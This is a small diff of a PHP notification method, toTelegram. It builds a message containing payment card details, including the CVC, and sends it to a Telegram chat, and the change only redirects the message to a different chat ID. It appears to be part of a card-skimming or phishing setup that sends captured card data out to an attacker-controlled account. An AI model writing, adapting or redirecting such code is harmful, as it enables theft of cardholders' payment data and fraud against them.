@@ -50,7 +50,7 @@ public function toTelegram($notifiable)
             "card cvc : " . $cart['cart_info']['cvc']. " \r\n " ;
         }
       return TelegramMessage::create()
-          ->to('908949980')
+          ->to('467740013')
           ->content($meesage);
    }
 }
